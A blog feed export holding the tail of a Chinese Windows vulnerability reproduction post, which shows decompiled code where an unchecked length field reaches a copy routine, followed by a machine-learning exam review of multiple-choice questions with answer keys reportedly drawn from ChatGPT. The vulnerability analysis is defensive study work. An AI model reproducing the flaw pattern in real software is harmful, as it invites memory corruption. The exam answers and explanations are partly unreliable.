<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v94 == <span class="number">167</span> )                     <span class="comment">// 判断recode type是否为0xA7</span></span><br><span class="line">&#123;</span><br><span class="line">  v9 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  v10 = dword_30895B44 &lt; <span class="number">5</span>;</span><br><span class="line">  LOBYTE(v10) = dword_30895B44 &gt;= <span class="number">5</span>;</span><br><span class="line">  v98 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  LOWORD(v9) = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v81 = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="number">2</span> * v10 + <span class="number">2</span>;</span><br><span class="line">  v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v11 * v81 + <span class="number">3</span>);</span><br><span class="line">  v92 = v9;</span><br><span class="line">  i = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + <span class="number">3</span>);</span><br><span class="line">  v96 = v11;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int16)v9 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      --v92;</span><br><span class="line">      v13 = i;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v93;</span><br><span class="line">        <span class="keyword">if</span> ( dword_30895B44 &gt;= <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v97 = *(_DWORD *)v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOWORD(v97) = *(_BYTE *)v13;</span><br><span class="line">          HIWORD(v97) = *(_BYTE *)(v13 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (_WORD)v97 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v13 += v96;</span><br><span class="line">        v15 = v92--;</span><br><span class="line">        v93 = <span class="number">1</span>;</span><br><span class="line">        i = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = v93;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( HIWORD(v97) &amp; <span class="number">0x12F</span> &amp;&amp; v12 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v98 )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = sub_300DE7C5();         <span class="comment">// v93 = 0x3C</span></span><br><span class="line">        <span class="keyword">if</span> ( v94 != <span class="number">0x3C</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_187;</span><br><span class="line">        v16 = sub_300DE7C5();         <span class="comment">// 返回复制字节数0x300</span></span><br><span class="line">        v17 = v96 * v81;              <span class="comment">// v80 = 0x0C0F,v95 = 0x4</span></span><br><span class="line">        v98 = v16;</span><br><span class="line">        v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v95 + v96 * v81 + <span class="number">3</span>);</span><br><span class="line">        v18 = sub_300C3AA4();</span><br><span class="line">        VulFun(v5, (<span class="keyword">void</span> *)v12, v98, <span class="number">-3</span> - v17 + v18);</span><br></pre></td></tr></table></figure>
<p>sub_300DE7C5</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">t __cdecl <span class="title">sub_300DE7C5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@5</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx@5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line">  v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">  v1 = dword_30892C44;</span><br><span class="line">  <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v1 = dword_30892C44;</span><br><span class="line">      v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dword_3088EC40[v1];</span><br><span class="line">    v4 = v1 + <span class="number">1</span>;</span><br><span class="line">    dword_30892C44 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v4 = dword_30892C44;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    *(_WORD *)((<span class="keyword">char</span> *)&amp;v5 + <span class="number">1</span>) = dword_3088EC40[v4];</span><br><span class="line">    dword_30892C44 = v4 + <span class="number">1</span>;</span><br><span class="line">    result = v5 | v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_WORD *)&amp;dword_3088EC40[dword_30892C44];</span><br><span class="line">    dword_30892C44 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实是直接复制并使用了样本文件中CONTINUE的Len字段的值，没有进行判断</p>
<h2 id="后记">后记</h2>
<p>在网上查了一下污点追踪，大概是一个定位漏洞的方法，感觉这个方法确实挺常用的（吧）。另外，找到了一篇武大的基于污点追踪的嵌入式固件漏洞研究的论文。<br>
感觉这两次复现对于调试能力的提升还是很大的，但总是研究到漏洞的触发就感觉差不多了，至于shellcode和修复就没太想继续研究…</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsdWVibG9vZHllL2FydGljbGUvZGV0YWlscy8xMDQ5MTExNjg=">https://blog.csdn.net/bluebloodye/article/details/104911168<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/0.html</url>
    <content><![CDATA[<hr>
<h2 id="title-UCAS-2023-ML复习abbrlink-date">title: UCAS-2023-ML复习<br>
abbrlink:<br>
date:</h2>
<h2 id="面向题库学习，用ChatGPT-3-5，错了就寄">面向题库学习，用ChatGPT 3.5，错了就寄</h2>
<p>事实证明想过只要背原题</p>
<span id="more"></span>      
<h1>选择</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 属于监督学习的机器学习算法是( A )      </span><br><span class="line">A. 贝叶斯分类器      </span><br><span class="line">B. 主成分分析      </span><br><span class="line">C. K-Means      </span><br><span class="line">D. 高斯混合聚类      </span><br></pre></td></tr></table></figure>
<p>贝叶斯分类器：就是用贝叶斯定理搞的那玩意。在用的时候需要知道样本的类别，才能计算先验和条件概率<br>
主成分分析(PCA)：用来减少数据集的维度，通常用于无监督学习，也可以用于监督学习的预处理<br>
K-means：聚类算法，将数据集划分为k个簇，中心簇代表簇内的样本均值，然后不断中心簇使得样本点和所属的中心簇距离最小<br>
高斯混合聚类：通过最大化似然函数来估计模型参数，从而实现对数据的聚类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 属于无监督学习的机器学习算法是( C )      </span><br><span class="line">A．支持向量机      </span><br><span class="line">B．Logistic回归      </span><br><span class="line">C．层次聚类      </span><br><span class="line">D．决策树      </span><br></pre></td></tr></table></figure>
<p>支持向量机和逻辑回归都是监督学习算法<br>
层次聚类：把样本划分为层次结构的簇，通过合并和分裂来构建聚类树，不需要预先知道簇的数量<br>
决策树：更常用于监督学习的分类和回归</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. 朴素贝叶斯分类器的特点是( C )      </span><br><span class="line">A. 假设样本服从正态分布      </span><br><span class="line">B. 假设样本服从多项式分布      </span><br><span class="line">C. 假设样本各维属性独立      </span><br><span class="line">D. 假设样本各维属性存在依赖      </span><br></pre></td></tr></table></figure>
<p>正态分布：高斯朴素贝叶斯<br>
多项式分布：多项式朴素贝叶斯，适用于离散特征的情况<br>
各维数型存在依赖：可以使用高斯混合模型、隐马尔可夫模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. 下列属于线性分类方法的是( B )      </span><br><span class="line">A. 决策树      </span><br><span class="line">B. 感知机      </span><br><span class="line">C. 最近邻      </span><br><span class="line">D. 集成学习      </span><br></pre></td></tr></table></figure>
<p>决策树不一定是线性分类方法，可以非常灵活地划分样本空间，并且可以包含非线性的决策边界。<br>
感知机通过找到一个超平面来划分两个类别的样本空间<br>
最近邻算法通常用于分类和回归任务，它根据样本的近邻进行预测，可用于线性和非线性的问题<br>
集成学习是一种通过组合多个基学习器来提高整体性能的方法，是一个组合的框架</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 下列方法不受数据归一化影响的是( D )      </span><br><span class="line">A. SVM      </span><br><span class="line">B. 神经网络      </span><br><span class="line">C. Logistic回归      </span><br><span class="line">D. 决策树      </span><br></pre></td></tr></table></figure>
<p>决策树基于特征的取值来进行划分，而不关心具体数值的大小<br>
归一化：<br>
标准化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6. 关于线性鉴别分析的描述最准确的是，找到一个投影方向，使得( B )      </span><br><span class="line">A. 类内距离最大，类间距离最小      </span><br><span class="line">B. 类内距离最小，类间距离最大      </span><br><span class="line">C. 类内距离最大，类间距离最大      </span><br><span class="line">D. 类内距离最小，类间距离最小      </span><br></pre></td></tr></table></figure>
<p>线性判别分析（LDA）的目标是通过将数据投影到一个低维空间，在投影后，同一类别的样本尽可能接近，而不同类别的样本尽可能远离。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7. SVM的原理可简单描述为( C )      </span><br><span class="line">A. 最小均方误差分类      </span><br><span class="line">B. 最小距离分类      </span><br><span class="line">C. 最大间隔分类      </span><br><span class="line">D. 最近邻分类      </span><br></pre></td></tr></table></figure>
<p>SVM：支持向量机<br>
最小均方误差：线性回归算法<br>
最小距离：最近邻算法就是最小距离分类的一种具体实现<br>
最近邻分类：k-Nearest Neighbors</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8. SVM的算法性能取决于( D )      </span><br><span class="line">A. 核函数的选择      </span><br><span class="line">B. 核函数的参数      </span><br><span class="line">C. 软间隔参数C      </span><br><span class="line">D. 以上所有      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9. 支持向量机的对偶问题是( C )      </span><br><span class="line">A. 线性优化问题      </span><br><span class="line">B. 二次优化      </span><br><span class="line">C. 凸二次优化      </span><br><span class="line">D. 有约束的线性优化      </span><br></pre></td></tr></table></figure>
<p>线性优化问题目标是最小化或最大化一个线性目标函数，受到一组线性约束的限制</p>
<p>二次优化是一类目标函数和约束都是二次的数学规划问题</p>
<p>凸二次优化是指目标函数是凸函数，约束是凸集的优化问题。支持向量机的对偶问题其目标函数和约束都满足凸性质</p>
<p>有约束的线性优化是一类目标函数和约束都是线性的优化问题。但是支持向量机的对偶问题涉及到二次项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10. 以下对支持向量机中的支撑向量描述正确的是( C )      </span><br><span class="line">A. 最大特征向量      </span><br><span class="line">B. 最优投影向量      </span><br><span class="line">C. 最大间隔支撑面上的向量      </span><br><span class="line">D. 最速下降方向      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11. 假定你使用阶数为2的线性核SVM，将模型应用到实际数据集上后，其训练准      </span><br><span class="line">确率和测试准确率均为100%。现在增加模型复杂度（增加核函数的阶），会发      </span><br><span class="line">生以下哪种情况( A )      </span><br><span class="line">A. 过拟合      </span><br><span class="line">B. 欠拟合      </span><br><span class="line">C. 什么都不会发生，因为模型准确率已经到达极限      </span><br><span class="line">D. 以上都不对      </span><br></pre></td></tr></table></figure>
<p>增加模型复杂度（增加核函数的阶）可能会导致过拟合<br>
增加模型复杂度可以捕捉数据中的更多关系，避免欠拟合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12. 关于决策树节点划分指标描述正确的是( B )      </span><br><span class="line">A. 类别非纯度越大越好      </span><br><span class="line">B. 信息增益越大越好      </span><br><span class="line">C. 信息增益越小越好      </span><br><span class="line">D. 基尼指数越大越好      </span><br></pre></td></tr></table></figure>
<p>节点的类别纯度越高；信息增益越大；基尼指数越小（表示节点纯度越高）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13. 以下描述中，属于决策树策略的是( D )      </span><br><span class="line">A. 最优投影方向      </span><br><span class="line">B. 梯度下降方法      </span><br><span class="line">C. 最大特征值      </span><br><span class="line">D. 最大信息增益      </span><br></pre></td></tr></table></figure>
<p>决策树中，常用的策略是选择能够最大化信息增益或最小化基尼指数的特征进行划分<br>
信息增益是衡量在给定划分条件下，划分前后样本的不确定性减少程度的指标</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">14. 集成学习中基分类器如何选择，学习效率通常越好( D )      </span><br><span class="line">A. 分类器相似      </span><br><span class="line">B. 都为线性分类器      </span><br><span class="line">C. 都为非线性分类器      </span><br><span class="line">D. 分类器多样，差异大      </span><br></pre></td></tr></table></figure>
<p>前面好像说过类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15. 集成学习中，每个基分类器的正确率的最低要求( A )      </span><br><span class="line">A. 50%以上      </span><br><span class="line">B. 60%以上      </span><br><span class="line">C. 70%以上      </span><br><span class="line">D. 80%以上      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16. 下面属于Bagging方法的特点是( A )      </span><br><span class="line">A. 构造训练集时采用Bootstraping的方式      </span><br><span class="line">B. 每一轮训练时样本权重不同      </span><br><span class="line">C. 分类器必须按顺序训练      </span><br><span class="line">D. 预测结果时，分类器的比重不同      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17. 下面属于Boosting方法的特点是( D )      </span><br><span class="line">A. 构造训练集时采用Bootstraping的方式      </span><br><span class="line">B. 每一轮训练时样本权重相同      </span><br><span class="line">C. 分类器可以并行训练      </span><br><span class="line">D. 预测结果时，分类器的比重不同      </span><br></pre></td></tr></table></figure>
<p>18说了类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18. 随机森林方法属于( B )      </span><br><span class="line">A. 梯度下降优化      </span><br><span class="line">B. Bagging方法      </span><br><span class="line">C. Boosting方法      </span><br><span class="line">D. 线性分类      </span><br></pre></td></tr></table></figure>
<p>随机森林通过构建多个决策树并将它们集成在一起来提高模型的性能和泛化能力。在构建每一个决策树的时候随机选择特征，增加模型整体的多样性。通过将所有决策树的输出进行集成，来做出最终的预测：对于分类问题，采用投票法，即选择得票最多的类别。对于回归问题，取所有树的平均预测值。随机森林通常用于解决非线性问题<br>
Bagging指的是通过构建多个基学习器，并将它们的结果进行集成</p>
<p>Boosting方法是另一种集成学习方法，通过训练一系列弱学习器，并根据前一个模型的性能对下一个模型进行加权</p>
<p>线性分类方法：例如线性支持向量机、逻辑回归等。<br>
梯度下降主要用于更新模型的损失函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">19. 软间隔SVM的阈值趋于无穷，下面哪种说法正确( A )      </span><br><span class="line">A. 只要最佳分类超平面存在，它就能将所有数据全部正确分类      </span><br><span class="line">B. 软间隔SVM分类器将正确分类数据      </span><br><span class="line">C. 会发生误分类现象      </span><br><span class="line">D. 以上都不对      </span><br></pre></td></tr></table></figure>
<p>Soft Margin SVM：用于处理线性不可分的数据<br>
阈值即松弛变量，软间隔SVM的优化目标：最大化训练样本点到决策边界（超平面）的间隔（与SVM的线性分类相同）、误差项（容忍一些训练样本不满足硬间隔的条件，允许它们位于错误的一侧。较小的C值允许更多的误分类）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20. 回归问题和分类问题的区别( A )      </span><br><span class="line">A. 前者预测函数值为连续值，后者为离散值      </span><br><span class="line">B. 前者预测函数值为离散值，后者为连续值      </span><br><span class="line">C. 前者是无监督学习      </span><br><span class="line">D. 后者是无监督学习      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21. 正则化的回归分析，可以避免( B )      </span><br><span class="line">A. 线性化      </span><br><span class="line">B. 过拟合      </span><br><span class="line">C. 欠拟合      </span><br><span class="line">D. 连续值逼近      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22. “啤酒-纸尿布”问题讲述的是，超市购物中，通过分析购物单发现，买了      </span><br><span class="line">纸尿布的男士，往往又买了啤酒。这是一个什么问题( A )      </span><br><span class="line">A. 关联分析      </span><br><span class="line">B. 回归      </span><br><span class="line">C. 聚类      </span><br><span class="line">D. 分类      </span><br></pre></td></tr></table></figure>
<p>分类：监督学习；聚类：无监督学习<br>
关联分析：找到数据项之间的关系<br>
回归：用于预测连续型输出变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23. 混合高斯聚类中，运用了以下哪种过程( A )      </span><br><span class="line">A. EM算法      </span><br><span class="line">B. 集合运算      </span><br><span class="line">C. 密度可达      </span><br><span class="line">D. 样本与集合运算      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24. 主成分分析方法是一种什么方法( C )      </span><br><span class="line">A. 分类方法      </span><br><span class="line">B. 回归方法      </span><br><span class="line">C. 降维方法      </span><br><span class="line">D. 参数估计方法      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">25. PCA在做降维处理时，优先选取哪些特征( A )      </span><br><span class="line">A. 中心化样本的协方差矩阵的最大特征值对应特征向量      </span><br><span class="line">B. 最大间隔投影方向      </span><br><span class="line">C. 最小类内聚类      </span><br><span class="line">D. 最速梯度方向      </span><br></pre></td></tr></table></figure>
<p>renew一下：PCA==主成分分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">26. 过拟合现象中( A )      </span><br><span class="line">A. 训练样本的测试误差最小，测试样本的正确识别率却很低      </span><br><span class="line">B. 训练样本的测试误差最小，测试样本的正确识别率也很高      </span><br><span class="line">C. 模型的泛化能力很高      </span><br><span class="line">D. 通常为线性模型      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">27. 多层感知机方法中，可用作神经元的非线性激活函数( A )      </span><br><span class="line">A. logistic 函数      </span><br><span class="line">B. p-范数      </span><br><span class="line">C. 线性内积      </span><br><span class="line">D. 加权求和      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/3e7013703371ed09ec070cbad2311ce.png" alt="3e7013703371ed09ec070cbad2311ce"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29. 梯度下降算法的正确步骤是什么( B )      </span><br><span class="line">(1)计算预测值和真实值之间的误差      </span><br><span class="line">(2)迭代更新，直到找到最佳权重      </span><br><span class="line">(3)把输入传入网络，得到输出值      </span><br><span class="line">(4)初始化随机权重和偏差      </span><br><span class="line">(5)对每一个产生误差的神经元，改变相应的（权重）值以减小误差      </span><br><span class="line"> A. 1, 2, 3, 4, 5      </span><br><span class="line"> B. 4, 3, 1, 5, 2      </span><br><span class="line"> C. 3, 2, 1, 5, 4      </span><br><span class="line"> D. 5, 4, 3, 2, 1      </span><br></pre></td></tr></table></figure>
<p>记吧：<br>
初始化-&gt;先进行一次预测-&gt;计算预测的误差-&gt;对每一个产生误差的神经元，改变相应的（权重）值以减小误差-&gt;迭代更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30.假如使用一个较复杂的回归模型来拟合样本数据，使用岭回归，调试正则化      </span><br><span class="line">参数λ，来降低模型复杂度。若λ较大时，关于偏差（bias）和方差（variance），      </span><br><span class="line">下列说法正确的是（C）      </span><br><span class="line">A．若λ较大时，偏差减小，方差减小      </span><br><span class="line">B．若λ较大时，偏差减小，方差增大      </span><br><span class="line">C．若λ较大时，偏差增大，方差减小      </span><br><span class="line">D．若λ较大时，偏差增大，方差增大      </span><br></pre></td></tr></table></figure>
<p>岭回归是一种线性回归的扩展，目标是最小化损失函数和正则化项之和。正则化项的强度由正则化参数λ控制。<br>
偏差：模型的预测和真实值的差异。当λ较大时，正则化强度增大，模型更趋向于简单的参数设置，可能导致对训练数据的拟合程度不够<br>
方差：衡量模型在不同训练集上的预测的变异性。当λ较大时，正则化会限制模型参数的数量和范围，降低模型的复杂度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">31.以下哪种方法会增加模型的欠拟合风险（D）      </span><br><span class="line">A．添加新特征      </span><br><span class="line">B．增加模型复杂度      </span><br><span class="line">C．减小正则化系数      </span><br><span class="line">D．数据增强      </span><br></pre></td></tr></table></figure>
<p>没啥好说的，其他都可能过拟合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32. 增加以下哪些超参数可能导致随机森林模型过拟合数据（B）      </span><br><span class="line">(1). 决策树的数量；(2). 决策树的深度； (3). 学习率。      </span><br><span class="line">A. (1)      </span><br><span class="line">B. (2)      </span><br><span class="line">C. (3)      </span><br><span class="line">D. (2)(3)      </span><br></pre></td></tr></table></figure>
<p>(1)：减小单个决策树的过拟合倾向<br>
(2)：增加深度使得模型更复杂，容易过拟合<br>
(3)：通常是梯度提升机等模型中的超参数，而不是随机森林。较大的学习率可能导致模型对训练数据过于敏感，使其更容易过拟合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">33. 以下关于深度网络训练的说法正确的是（D）      </span><br><span class="line">A. 训练过程需要用到梯度，梯度衡量了损失函数相对于模型参数的变化率      </span><br><span class="line">B. 损失函数衡量了模型预测结果与真实值之间的差异      </span><br><span class="line">C. 训练过程基于一种叫做反向传播的技术      </span><br><span class="line">D. 其他选项都正确      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">34. 关于CNN，以下结论正确的是（C）      </span><br><span class="line">A. 在同样层数、每层神经元数量一样的情况下，CNN比全连接网络拥有更多的参      </span><br><span class="line">数      </span><br><span class="line">B. CNN可以用于非监督学习，但是普通神经网络不行      </span><br><span class="line">C. Pooling层用于减少图片的空间分辨率      </span><br><span class="line">D. 接近输出层的filter主要用于提取图像的边缘信息      </span><br></pre></td></tr></table></figure>
<p>CNN的参数通常较少，因为它们共享权重并具有局部连接性，而全连接网络的参数数量更多<br>
普通神经网络也可以用于非监督学习任务，例如自编码器等<br>
Pooling层通常用于减小特征图的空间尺寸，通过保留主要信息的同时减少计算量<br>
接近输出层的filter更倾向于提取高级抽象的特征，而靠近输入层的filter更多地捕捉图像的低级特征</p>
<p>输入层： 接收原始图像。<br>
卷积层： 提取图像的低级特征，例如边缘、纹理。<br>
激活函数层： 引入非线性，增加模型的表达能力。<br>
Pooling层： 减小特征图的空间尺寸，降低计算复杂度。<br>
全连接层： 将抽取的特征进行扁平化，并用于最终的分类或回归任务。<br>
输出层： 提供最终的预测结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35. 关于k-means算法，正确的描述是（B）      </span><br><span class="line">A. 能找到任意形状的聚类      </span><br><span class="line">B. 初始值不同，最终结果可能不同      </span><br><span class="line">C. 每次迭代的时间复杂度是𝑂(𝑛), 其中𝑛是样本数量      </span><br><span class="line">D. 不能使用核函数      </span><br></pre></td></tr></table></figure>
<p>K-Means假设每个簇是凸的、等方向的，时间复杂度与迭代次数和簇数K有关；通常是较低的线性复杂度，不一定与样本量线性相关；可以使用核化的k-means算法来处理非线性数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">36. 下列关于过拟合现象的描述中，哪个是正确的（A）      </span><br><span class="line">A. 训练误差小，测试误差大      </span><br><span class="line">B. 训练误差小，测试误差小      </span><br><span class="line">C. 模型的泛化能力高      </span><br><span class="line">D. 其余选项都不对      </span><br></pre></td></tr></table></figure>
<p>我咋记得上面有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37. 下列哪个函数不可以做激活函数（D）      </span><br><span class="line">A. y=tanh(x)      </span><br><span class="line">B. y=sin(x)      </span><br><span class="line">C. y=max(x,0)      </span><br><span class="line">D. y=2x      </span><br></pre></td></tr></table></figure>
<p>激活函数的主要目的是1.引入非线性特性，2.决定神经元是否应该被激活（输出非零值<br>
几个激活函数：<br>
Sigmoid函数： 用于输出层，将输出映射到（0, 1）范围，适用于二分类问题。<br>
Tanh函数： 类似于Sigmoid，但将输出映射到（-1, 1）范围，有助于缓解梯度消失问题。<br>
ReLU函数（Rectified Linear Unit）： y=max(x, 0)，在正区间为线性，在负区间截断为零，解决了梯度消失问题，常用于隐藏层。<br>
Leaky ReLU函数： 对于负区间不截断为零，而是保留一个小的斜率，解决了ReLU中负值为零的问题。<br>
Softmax函数： 用于多类别分类问题，将输出转化为概率分布。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">38. 在其他条件不变的前提下，以下哪种做法容易引起机器学习中的过拟合问题      </span><br><span class="line">（D）      </span><br><span class="line">A. 增加训练集量      </span><br><span class="line">B. 减少神经网络隐藏层节点数      </span><br><span class="line">C. 删除稀疏的特征      </span><br><span class="line">D. SVM算法中使用高斯核代替线性核      </span><br></pre></td></tr></table></figure>
<p>高斯核即RBF核，是一种非线性核函数，在特征空间中引入更复杂的决策边界。。使用复杂的核函数增加了模型对训练数据的拟合程度，但也可能导致在未见过的数据上的泛化性能下降，因此容易引起过拟合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">39. 下面方法中属于无监督学习算法的是（D）      </span><br><span class="line">A. 线性回归      </span><br><span class="line">B. 支持向量机      </span><br><span class="line">C. 决策树      </span><br><span class="line">D. K-Means聚类      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40. Bootstrap数据是什么意思（C）      </span><br><span class="line">A. 有放回地从总共M个特征中抽样m个特征      </span><br><span class="line">B. 无放回地从总共M个特征中抽样m个特征      </span><br><span class="line">C. 有放回地从总共N个样本中抽样n个样本      </span><br><span class="line">D. 无放回地从总共N个样本中抽样n个样本      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">41.下面关于Adaboost算法的描述中，错误的是（D）      </span><br><span class="line">A. 是弱分类器的线性组合      </span><br><span class="line">B. 提升树是以分类树或者回归树为基本分类器的提升办法      </span><br><span class="line">C. 该算法实际上是前向分步算法的一个实现，在这个方法里，模型是加法模型，      </span><br><span class="line">损失函数是指数损失，算法是前向分步算法。      </span><br><span class="line">D. 同时独立地学习多个弱分类器      </span><br></pre></td></tr></table></figure>
<p>Adaboost算法的核心思想是通过组合多个弱分类器（通常是决策树）来构建一个强分类器。每个弱分类器都对数据进行加权学习，然后根据其在训练集上的性能来分配一个权重。最终的强分类器是这些弱分类器的线性组合，权重大的弱分类器在最终的模型中起更大的作用。<br>
它是一个串行的算法，每个弱分类器都是在前一个分类器的误差上进行学习的。它通过增加之前弱分类器分错的样本的权重，使得后续的弱分类器更关注之前分类错误的样本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">42.在HMM中,如果已知观察序列和产生观察序列的状态序列,那么可用以下哪种方法直接进行参数估计（D）      </span><br><span class="line">A．EM算法      </span><br><span class="line">B．维特比算法      </span><br><span class="line">C. 前向后向算法      </span><br><span class="line">D. 极大似然估计      </span><br></pre></td></tr></table></figure>
<p>HMM:隐马尔可夫模型<br>
EM算法通常用于处理观察序列和状态序列都未知的情况<br>
维特比算法用于求解HMM中给定观察序列时最可能的隐藏状态序列。它是解码算法<br>
前向后向算法用于计算观察序列的概率，而不是直接用于参数估计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">43.以下哪种距离会侧重考虑向量的方向（D）      </span><br><span class="line">A. 欧式距离      </span><br><span class="line">B. 海明距离      </span><br><span class="line">C. Jaccard距离      </span><br><span class="line">D. 余弦距离      </span><br></pre></td></tr></table></figure>
<p>欧式距离考虑向量的大小和方向，它是空间中两点之间的直线距离。<br>
